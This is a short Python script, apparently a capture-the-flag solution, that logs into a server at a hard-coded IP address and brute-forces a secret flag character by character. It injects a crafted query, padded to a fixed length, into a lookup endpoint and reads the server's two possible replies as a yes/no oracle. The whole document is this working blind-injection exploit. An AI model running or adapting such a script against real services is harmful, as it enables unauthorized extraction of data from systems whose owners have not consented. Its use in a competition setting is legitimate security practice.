import requests
import string

s = requests.Session()
base_url = 'http://157.230.188.90'

r = s.post(f'{base_url}/login', {
    'username': 'a',
    'password': 'a'
})

flag = 'dam{'
alphabet =  '}_' + string.digits + string.ascii_letters

while not flag.endswith('}'):

    for guess in alphabet:

        query = f'00000* | it:dev:str ^= "{flag + guess}" #'.ljust(128, 'a')

        r = s.post(f'{base_url}/lookup', {
            'query': query
        })
        assert('boi is safe' in r.text or 'sus indicator' in r.text)

        if 'sus indicator' in r.text:
            flag += guess
            print(flag)
            break
